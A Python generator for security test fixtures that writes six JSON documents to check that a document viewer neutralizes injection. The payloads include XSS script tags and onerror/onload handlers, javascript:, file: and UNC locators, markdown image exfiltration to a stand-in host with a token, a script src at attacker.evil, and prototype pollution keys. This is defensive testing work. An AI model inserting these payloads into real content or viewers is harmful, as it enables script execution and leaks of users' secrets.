"""
fixtures/generate_corpus_s.py — Generator for Corpus S (Security Injection Test Suite).
Materializes 6 security fixtures verifying that XSS script tags, HTML event handlers,
javascript: / file: / UNC asset locators, markdown exfiltration payloads, prototype pollution,
and external active_document.js scripts are neutralized with 0 execution under strict CSP.
Complies strictly with Spec r2 §5, §6, §7, §11 (AC-24, AC-42).
"""

import hashlib
import json
from pathlib import Path


def generate_corpus_s(target_dir: Path):
    target_dir.mkdir(parents=True, exist_ok=True)
    results = []

    def record_fixture(fname: str, doc: dict, vector: str, protection: str):
        raw_b = json.dumps(doc, indent=2, ensure_ascii=False).encode("utf-8")
        (target_dir / fname).write_bytes(raw_b)
        results.append({
            "file": fname,
            "bytes": len(raw_b),
            "sha256": hashlib.sha256(raw_b).hexdigest().lower(),
            "vector": vector,
            "expected_protection": protection
        })

    # s01: XSS script tags in metadata, units, authors, groups
    doc_s01 = {
        "format": "paralleldoc",
        "version": "3.0",
        "metadata": {
            "document_id": "doc-sec-01-script-tags",
            "revision": "rev-1",
            "title": "<script>window.XSS_DETECTED=true;alert('XSS-TITLE')</script>",
            "author_refs": ["auth-sec-01"]
        },
        "authors": [
            {
                "id": "auth-sec-01",
                "kind": "human",
                "name": "<script src=\"https://attacker.evil/payload.js\"></script>Malicious Author"
            }
        ],
        "units": [
            {
                "id": "u-sec-01",
                "kind": "source",
                "title": "<script>alert('UNIT_TITLE')</script>Clause 1",
                "text": "Payload injection inside body: <script>document.body.innerHTML='PWNED';</script> Plain text content.",
                "text_format": "plain",
                "author_refs": ["auth-sec-01"],
                "epistemic": "reported",
                "status": "reviewed",
                "source_refs": [],
                "asset_ids": [],
                "provenance": {"label": "<script>alert('PROVENANCE')</script>Doc §1"}
            }
        ],
        "groups": [
            {
                "id": "g-sec-01",
                "title": "<script>alert('GROUP')</script>Security Test Group",
                "unit_refs": ["u-sec-01"]
            }
        ],
        "visuals": [],
        "assets": [],
        "profiles": []
    }
    record_fixture("s01_xss_script_tags.json", doc_s01, "SCRIPT_TAGS", "Strict textContent escaping; 0 script execution")

    # s02: HTML event handlers (onerror, onload, onmouseover)
    doc_s02 = {
        "format": "paralleldoc",
        "version": "3.0",
        "metadata": {
            "document_id": "doc-sec-02-event-handlers",
            "revision": "rev-1",
            "title": "HTML Event Handler Injection",
            "author_refs": ["auth-sec-01"]
        },
        "authors": [{"id": "auth-sec-01", "kind": "tool", "name": "Security Tester"}],
        "units": [
            {
                "id": "u-sec-02",
                "kind": "analysis",
                "title": "Inline Event Handlers",
                "text": "Testing img onerror: <img src=x onerror=\"window.XSS_EVENT=1;alert('ONERROR')\"> and svg onload: <svg onload=\"alert('SVG_ONLOAD')\"><circle r=10></circle></svg>",
                "text_format": "markdown-safe",
                "author_refs": ["auth-sec-01"],
                "epistemic": "hypothesis",
                "status": "draft",
                "source_refs": [],
                "asset_ids": []
            }
        ],
        "groups": [{"id": "g-sec-02", "title": "Event Handler Group", "unit_refs": ["u-sec-02"]}],
        "visuals": [],
        "assets": [],
        "profiles": []
    }
    record_fixture("s02_html_event_handlers.json", doc_s02, "EVENT_HANDLERS", "HTML sanitization / escaping; handlers neutralized")

    # s03: JavaScript and File locators
    doc_s03 = {
        "format": "paralleldoc",
        "version": "3.0",
        "metadata": {
            "document_id": "doc-sec-03-locators",
            "revision": "rev-1",
            "title": "Malicious Locators Injection",
            "author_refs": ["auth-sec-01"]
        },
        "authors": [{"id": "auth-sec-01", "kind": "tool", "name": "Security Tester"}],
        "units": [
            {
                "id": "u-sec-03",
                "kind": "source",
                "title": "Dangerous Asset Locators",
                "text": "Clause referencing forbidden locator schemas.",
                "text_format": "plain",
                "author_refs": ["auth-sec-01"],
                "epistemic": "reported",
                "status": "reviewed",
                "source_refs": [],
                "asset_ids": ["ast-sec-js", "ast-sec-file", "ast-sec-unc"],
                "provenance": {"label": "Spec §5"}
            }
        ],
        "groups": [{"id": "g-sec-03", "title": "Locator Group", "unit_refs": ["u-sec-03"]}],
        "visuals": [],
        "assets": [
            {
                "id": "ast-sec-js",
                "mime": "image/png",
                "sha256": "0000000000000000000000000000000000000000000000000000000000000000",
                "byte_length": 100,
                "width": 10, "height": 10,
                "alt": "JavaScript scheme",
                "caption": "JS locator",
                "author_refs": ["auth-sec-01"],
                "provenance": {"label": "Spec §5"},
                "locator": {"mode": "external", "url": "javascript:alert('XSS_LOCATOR')"}
            },
            {
                "id": "ast-sec-file",
                "mime": "image/png",
                "sha256": "0000000000000000000000000000000000000000000000000000000000000000",
                "byte_length": 100,
                "width": 10, "height": 10,
                "alt": "File scheme",
                "caption": "File locator",
                "author_refs": ["auth-sec-01"],
                "provenance": {"label": "Spec §5"},
                "locator": {"mode": "relative", "path": "file:///C:/Windows/System32/drivers/etc/hosts"}
            },
            {
                "id": "ast-sec-unc",
                "mime": "image/png",
                "sha256": "0000000000000000000000000000000000000000000000000000000000000000",
                "byte_length": 100,
                "width": 10, "height": 10,
                "alt": "UNC share scheme",
                "caption": "UNC locator",
                "author_refs": ["auth-sec-01"],
                "provenance": {"label": "Spec §5"},
                "locator": {"mode": "relative", "path": "\\\\192.168.1.100\\smbshare\\exfil.png"}
            }
        ],
        "profiles": []
    }
    record_fixture("s03_javascript_and_file_locators.json", doc_s03, "LOCATOR_SCHEMES", "AssetLocatorGuard rejects javascript:, file:, UNC paths")

    # s04: Markdown injection (image exfiltration, javascript links)
    doc_s04 = {
        "format": "paralleldoc",
        "version": "3.0",
        "metadata": {
            "document_id": "doc-sec-04-markdown",
            "revision": "rev-1",
            "title": "Markdown Exfiltration Injection",
            "author_refs": ["auth-sec-01"]
        },
        "authors": [{"id": "auth-sec-01", "kind": "tool", "name": "Security Tester"}],
        "units": [
            {
                "id": "u-sec-04",
                "kind": "analysis",
                "title": "Markdown Exfiltration Vectors",
                "text": "Testing external image leak: ![exfil](https://evil-analytics.org/leak?token=SECRET_123) and javascript link: [Click for info](javascript:window.PWNED=1;alert('MD_LINK_XSS'))",
                "text_format": "markdown-safe",
                "author_refs": ["auth-sec-01"],
                "epistemic": "hypothesis",
                "status": "draft",
                "source_refs": [],
                "asset_ids": []
            }
        ],
        "groups": [{"id": "g-sec-04", "title": "Markdown Security Group", "unit_refs": ["u-sec-04"]}],
        "visuals": [],
        "assets": [],
        "profiles": []
    }
    record_fixture("s04_markdown_injection.json", doc_s04, "MARKDOWN_EXFIL", "CSP connect-src/img-src 'none'; javascript: link protocol blocked")

    # s05: Namespaced extension payload (prototype pollution)
    doc_s05 = {
        "format": "paralleldoc",
        "version": "3.0",
        "metadata": {
            "document_id": "doc-sec-05-proto",
            "revision": "rev-1",
            "title": "Prototype Pollution Test",
            "author_refs": ["auth-sec-01"]
        },
        "authors": [{"id": "auth-sec-01", "kind": "tool", "name": "Security Tester"}],
        "units": [
            {
                "id": "u-sec-05",
                "kind": "source",
                "title": "Prototype Pollution Clause",
                "text": "Payload testing object key isolation in extensions.",
                "text_format": "plain",
                "author_refs": ["auth-sec-01"],
                "epistemic": "reported",
                "status": "reviewed",
                "source_refs": [],
                "asset_ids": [],
                "provenance": {"label": "Spec §8"}
            }
        ],
        "groups": [{"id": "g-sec-05", "title": "Proto Test Group", "unit_refs": ["u-sec-05"]}],
        "visuals": [],
        "assets": [],
        "profiles": [],
        "extensions": {
            "astrai.org/safe-ext": {
                "__proto__": {"polluted": "yes"},
                "constructor": {"prototype": {"isAdmin": True}},
                "payload": "<script>alert('PROTO')</script>"
            }
        }
    }
    record_fixture("s05_namespaced_extension_payload.json", doc_s05, "PROTOTYPE_POLLUTION", "Object.create(null) / safe property access; Object prototype untouched")

    # s06: Active document JS rejection (external script proximity test)
    doc_s06 = {
        "format": "paralleldoc",
        "version": "3.0",
        "metadata": {
            "document_id": "doc-sec-06-active-doc",
            "revision": "rev-1",
            "title": "Active Document JS Isolation Verification",
            "author_refs": ["auth-sec-01"]
        },
        "authors": [{"id": "auth-sec-01", "kind": "tool", "name": "Security Tester"}],
        "units": [
            {
                "id": "u-sec-06",
                "kind": "source",
                "title": "Active Document Isolation",
                "text": "Verifies that the viewer runtime never loads or executes active_document.js located in the same directory.",
                "text_format": "plain",
                "author_refs": ["auth-sec-01"],
                "epistemic": "reported",
                "status": "reviewed",
                "source_refs": [],
                "asset_ids": [],
                "provenance": {"label": "Spec §11 line 489"}
            }
        ],
        "groups": [{"id": "g-sec-06", "title": "Active Doc Group", "unit_refs": ["u-sec-06"]}],
        "visuals": [],
        "assets": [],
        "profiles": []
    }
    record_fixture("s06_active_document_js_rejection.json", doc_s06, "ACTIVE_DOCUMENT_JS", "active_document.js never loaded; 0 external scripts evaluated")

    # Control table
    (target_dir / "corpus_S_control.json").write_text(json.dumps(results, indent=2), encoding="utf-8")
    print(f"Corpus S successfully materialized in {target_dir} ({len(results)} fixtures).")


if __name__ == "__main__":
    generate_corpus_s(Path("fixtures/corpus_S"))
